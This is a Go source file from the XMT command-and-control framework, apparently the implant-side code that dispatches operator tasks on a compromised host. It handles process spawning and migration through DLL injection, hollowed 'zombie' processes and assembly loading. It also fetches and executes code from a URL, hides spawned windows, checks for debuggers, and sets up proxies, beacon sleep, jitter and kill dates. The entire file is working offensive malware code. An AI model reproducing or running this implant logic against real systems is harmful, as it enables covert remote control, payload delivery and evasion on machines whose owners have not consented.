// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"context"
	"io"
	"io/fs"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const fourOhFour = "0x404"

const (
	_ uint8 = 1 << iota
	flagNoReturnOutput
	flagStopOnError
)

var (
	_ runnable = (*cmd.DLL)(nil)
	_ runnable = (*cmd.Zombie)(nil)
	_ runnable = (*cmd.Process)(nil)
	_ runnable = (*cmd.Assembly)(nil)
)

var errInvalidTask = xerr.Sub(fourOhFour, 0xFE)

func muxHandleSpawnAsync(s *Session, n *com.Packet) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.muxHandleSpawnAsync()")
	}
	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
	muxHandleSend(s, n, w, muxHandleSpawnSync(s, n, w))
	w = nil
}
func muxHandleScriptAsync(s *Session, n *com.Packet) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.muxHandleScriptAsync()")
	}
	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
	muxHandleSend(s, n, w, muxHandleScript(s, n, w))
	w = nil
}
func defaultClientMux(s *Session, n *com.Packet) bool {
	if n.ID < task.MvRefresh || n.ID == RvResult {
		return false
	}
	if cout.Enabled {
		s.log.Debug(`[%s/MuX] Received packet %s.`, s.ID, n)
	}
	switch {
	case n.ID == task.MvSpawn:
		go muxHandleSpawnAsync(s, n)
		return true
	case n.ID == task.MvScript:
		go muxHandleScriptAsync(s, n)
		return true
	case n.ID > RvResult:
		go muxHandleExternalAsync(s, n)
		return true
	}
	var (
		w   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		err = muxHandleInternal(s, n, w)
	)
	if err == nil && n.ID == task.MvMigrate {
		if w = nil; cout.Enabled {
			s.log.Info("[%s/Mux] Migrate Job %d passed, not sending response back!", s.ID, n.Job)
		}
		return true
	}
	muxHandleSend(s, n, w, err)
	w = nil
	return true
}
func muxHandleExternalAsync(s *Session, n *com.Packet) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.muxHandleExternalAsync()")
	}
	var (
		w = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		t = task.Mappings[n.ID]
	)
	if t == nil {
		if w.WriteString(fourOhFour); cout.Enabled {
			s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
		}
		w.Flags |= com.FlagError
		muxHandleSend(s, n, w, nil)
		return
	}
	if n.ID == task.TvWait {
		if cout.Enabled {
			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
		}
		muxHandleSend(s, n, w, nil)
		return
	}
	if cout.Enabled {
		s.log.Trace("[%s/MuX] Starting async Task for Job %d.", s.ID, n.Job)
	}
	muxHandleSend(s, n, w, t(s.ctx, n, w))
	t = nil
}
func muxHandleScript(s *Session, n, w *com.Packet) error {
	if cout.Enabled {
		s.log.Trace("[%s/MuX] Starting Script Task for Job %d.", s.ID, n.Job)
	}
	o, err := n.Uint8()
	if err != nil {
		return err
	}
	var (
		b = buffers.Get().(*data.Chunk)
		e = o&flagStopOnError != 0
		r = o&flagNoReturnOutput == 0
		d []byte
		z uint8
		v com.Packet
		t task.Tasker
	)
loop:
	for err = nil; err == nil; b.Reset() {
		v.Reset()
		if err = n.ReadUint8(&v.ID); err != nil {
			break
		}
		if err = n.ReadBytes(&d); err != nil && err != io.EOF {
			break
		}
		v.Grow(len(d))
		v.Write(d)
		w.WriteUint8(v.ID)
		switch d, err = nil, nil; {
		case v.ID == task.MvScript:
			if cout.Enabled {
				s.log.Warning("[%s/MuX] Attempted to run a Script packed in Script!", s.ID)
			}
			if e {
				err = syscall.EINVAL
				break loop
			}
			w.WriteBool(false)
			w.WriteString(syscall.EINVAL.Error())
			continue loop
		case v.ID == task.MvSpawn:
			err = muxHandleSpawnSync(s, &v, b)
		case v.ID < RvResult:
			switch err = muxHandleInternal(s, &v, b); {
			case err == nil && v.ID == task.MvRefresh:
				z = infoRefresh
			case err == nil && (v.ID == task.MvTime || v.ID == task.MvProfile):
				z = infoSync
			}
		default:
			if t = task.Mappings[v.ID]; t == nil {
				if e {
					err = errInvalidTask
					break loop
				}
				w.WriteBool(false)
				w.WriteString(fourOhFour)
				continue loop
			}
			err = t(s.ctx, &v, b)
		}
		if err != nil {
			if !e {
				w.WriteBool(false)
				w.WriteString(err.Error())
				err = nil
				continue loop
			}
			break loop
		}
		if w.WriteBool(true); r && b.Size() > 0 {
			w.WriteBytes(b.Payload())
			continue loop
		}
		w.WriteInt8(0)
	}
	b.Clear()
	v.Clear()
	// Update the server when a MvTime/MvRefresh/MvProfile was in a script.
	// This packet is a special type that is associated with a Job. If the Job
	// does not exist, the Packet is disregarded.
	if n.Clear(); z > 0 {
		s.writeDeviceInfo(infoSync, w)
		q := &com.Packet{ID: SvResync, Job: n.Job, Device: s.ID}
		q.WriteUint8(z)
		s.writeDeviceInfo(z, q)
		s.queue(q)
	}
	if buffers.Put(b); err == io.EOF {
		return nil
	}
	return err
}
func muxHandleSend(s *Session, n, w *com.Packet, e error) {
	if e != nil {
		w.Clear()
		w.Flags |= com.FlagError
		if w.WriteString(e.Error()); cout.Enabled {
			s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, e.Error())
		}
	} else if cout.Enabled {
		s.log.Trace("[%s/MuX] Task with Job %d completed!", s.ID, n.Job)
	}
	// NOTE(dij): For now, we're gonna let these block.
	//            I'll track and see if they should throw errors instead.
	s.write(true, w)
}
func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
	switch n.ID {
	case task.MvPwd:
		d, err := syscall.Getwd()
		if err != nil {
			return err
		}
		w.WriteString(d)
		return nil
	case task.MvCwd:
		d, err := n.StringVal()
		if err != nil {
			return err
		}
		return syscall.Chdir(device.Expand(d))
	case task.MvList:
		d, err := n.StringVal()
		if err != nil {
			return err
		}
		if len(d) == 0 {
			d = "."
		} else {
			d = device.Expand(d)
		}
		s, err := os.Stat(d)
		if err != nil {
			return err
		}
		if !s.IsDir() {
			w.WriteUint32(1)
			w.WriteString(s.Name())
			w.WriteInt32(int32(s.Mode()))
			w.WriteInt64(s.Size())
			w.WriteInt64(s.ModTime().Unix())
			return nil
		}
		var l []fs.DirEntry
		if l, err = os.ReadDir(d); err != nil {
			return err
		}
		w.WriteUint32(uint32(len(l)))
		for i, m := uint32(0), uint32(len(l)); i < m; i++ {
			w.WriteString(l[i].Name())
			if x, err := l[i].Info(); err == nil {
				w.WriteInt32(int32(x.Mode()))
				w.WriteInt64(x.Size())
				w.WriteInt64(x.ModTime().Unix())
				continue
			}
			w.WriteInt32(0)
			w.WriteInt64(0)
			w.WriteInt64(0)
		}
		return nil
	case task.MvTime:
		t, err := n.Uint8()
		if err != nil {
			return err
		}
		switch t {
		case timeSleepJitter:
			j, err1 := n.Int8()
			if err1 != nil {
				return err1
			}
			d, err1 := n.Int64()
			if err1 != nil {
				return err1
			}
			switch {
			case j == -1:
				// NOTE(dij): This handles a special case where Script packets are
				//            used to set the sleep/jitter since they don't have access
				//            to the previous values.
				//            A packet with a '-1' Jitter value will be ignored.
			case j > 100:
				s.jitter = 100
			case j < 0:
				s.jitter = 0
			default:
				s.jitter = uint8(j)
			}
			if d > 0 {
				// NOTE(dij): Ditto here, except for sleep. Anything less than zero
				//            will work.
				s.sleep = time.Duration(d)
			}
		case timeKillDate:
			u, err1 := n.Int64()
			if err1 != nil {
				return err1
			}
			if u == 0 {
				s.kill = nil
			} else {
				d := time.Unix(u, 0)
				s.kill = &d
			}
		case timeWorkHours:
			var w cfg.WorkHours
			if err = w.UnmarshalStream(n); err != nil {
				return err
			}
			if s.work != nil {
				s.Wake()
			}
			if w.Empty() {
				s.work = nil
			} else {
				s.work = &w
			}
		}
		s.writeDeviceInfo(infoSync, w)
		return nil
	case task.MvProxy:
		var (
			v string
			r uint8
		)
		if err := n.ReadString(&v); err != nil {
			return err
		}
		if err := n.ReadUint8(&r); err != nil {
			return err
		}
		if r == 0 {
			if i := s.Proxy(v); i != nil {
				if err := i.Close(); err != nil {
					return err
				}
				s.writeDeviceInfo(infoProxy, w)
				return nil
			}
			return os.ErrNotExist
		}
		var (
			b string
			k []byte
		)
		if err := n.ReadString(&b); err != nil {
			return err
		}
		if err := n.ReadBytes(&k); err != nil {
			return err
		}
		p, err := parseProfile(k)
		if err != nil {
			return xerr.Wrap("parse Profile", err)
		}
		if r == 1 {
			if i := s.Proxy(v); i != nil {
				if err = i.Replace(b, p); err != nil {
					return err
				}
				s.writeDeviceInfo(infoProxy, w)
				return nil
			}
			return os.ErrNotExist
		}
		if _, err = s.NewProxy(v, b, p); err != nil {
			return err
		}
		s.writeDeviceInfo(infoProxy, w)
		return nil
	case task.MvMounts:
		m, err := device.Mounts()
		if err != nil {
			return err
		}
		data.WriteStringList(w, m)
		return nil
	case task.MvMigrate:
		var (
			k bool
			i string
			p []byte
		)
		if err := n.ReadBool(&k); err != nil {
			return err
		}
		if err := n.ReadString(&i); err != nil {
			return err
		}
		if err := n.ReadBytes(&p); err != nil {
			return err
		}
		e, v, err := readCallable(s.ctx, true, n)
		if err != nil {
			return err
		}
		if _, err = s.MigrateProfile(k, i, p, n.Job, spawnDefaultTime, e); err != nil {
			if len(v) > 0 {
				os.Remove(v)
			}
			return err
		}
		return nil
	case task.MvRefresh:
		if cout.Enabled {
			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
		}
		if err := local.Device.Refresh(); err != nil {
			return err
		}
		s.Device = local.Device.Machine
		s.writeDeviceInfo(infoRefresh, w)
		return nil
	case task.MvProfile:
		b, err := n.Bytes()
		if err != nil {
			return err
		}
		p, err := parseProfile(b)
		if err != nil {
			return xerr.Wrap("parse Profile", err)
		}
		if s.swap = p; cout.Enabled {
			s.log.Debug("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
		}
		s.writeDeviceInfo(infoSync, w)
		return nil
	case task.MvProcList:
		e, err := cmd.Processes()
		if err != nil {
			return err
		}
		if err = w.WriteUint32(uint32(len(e))); err != nil {
			return err
		}
		if len(e) == 0 {
			return nil
		}
		for i, m := uint32(0), uint32(len(e)); i < m; i++ {
			if err = e[i].MarshalStream(w); err != nil {
				return err
			}
		}
		return nil
	case task.MvCheckDebug:
		w.WriteBool(device.IsDebugged())
		return nil
	}
	// Shouldn't happen
	return errInvalidTask
}
func muxHandleSpawnSync(s *Session, n *com.Packet, w data.Writer) error {
	if cout.Enabled {
		s.log.Info("[%s/MuX] Starting Spawn Task for Job %d.", s.ID, n.Job)
	}
	var (
		i   string
		p   []byte
		err = n.ReadString(&i)
	)
	if err != nil {
		return err
	}
	if err = n.ReadBytes(&p); err != nil {
		return err
	}
	e, v, err := readCallable(s.ctx, false, n)
	if err != nil {
		return err
	}
	var c uint32
	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
		if len(v) > 0 {
			os.Remove(v)
		}
		return err
	}
	w.WriteUint32(c)
	return nil
}
func readCallable(x context.Context, m bool, r data.Reader) (cmd.Runnable, string, error) {
	var (
		f   *filter.Filter
		err = filter.UnmarshalStream(r, &f)
	)
	if err != nil {
		return nil, "", err
	}
	var (
		e cmd.Runnable
		j bool
		v string
		t uint8
	)
	if err = r.ReadUint8(&t); err != nil {
		return nil, "", err
	}
	// NOTE(dij): We're using the Background context here as we don't want
	//            cancellation for this process as we're creating it to
	//            succeed us (or be independent).
	switch t {
	case task.TvDLL:
		var d *cmd.DLL
		if d, _, j, err = task.DLLUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		if d.Timeout = 0; j {
			v = d.Path
		}
		e = d
	case task.TvZombie:
		var z *cmd.Zombie
		if z, _, err = task.ZombieUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		z.Timeout = 0
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		z.SetNoWindow(true)
		z.SetWindowDisplay(0)
		e = z
	case task.TvExecute:
		var p *cmd.Process
		if p, _, err = task.ProcessUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		p.Timeout = 0
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		p.SetNoWindow(true)
		p.SetWindowDisplay(0)
		e = p
	case task.TvAssembly:
		var a *cmd.Assembly
		if a, _, err = task.AssemblyUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		a.Timeout = 0
		e = a
	case task.TvPullExecute:
		var u, q string
		if err = r.ReadString(&u); err != nil {
			return nil, "", err
		}
		if err = r.ReadString(&q); err != nil {
			return nil, "", err
		}
		// NOTE(dij): We HAVE to set the Context as the parent to avoid
		//            io locking issues. *shrug* Luckily, the 'Release' function
		//            does it job!
		if e, v, err = man.WebExec(x, nil, u, q); err != nil {
			return nil, "", err
		}
	default:
		if v, err = os.Executable(); err != nil {
			return nil, "", err
		}
		c := cmd.NewProcessContext(context.Background(), v)
		c.SetNoWindow(true)
		c.SetWindowDisplay(0)
		e = c
	}
	if e.SetParent(f); !j {
		v = ""
	}
	// Check if we are Migrating (m == true) and if we have an empty filter first.
	if m && f == nil || f.Empty() {
		if _, ok := e.(*cmd.Process); !ok {
			// Refusing to run Migrate that is NOT A SEPARATE process WITHOUT A
			// non-empty/nil Filter.
			// This will cause migrate to go through and then crash.
			return nil, "", filter.ErrNoProcessFound
		}
	}
	return e, v, nil
}
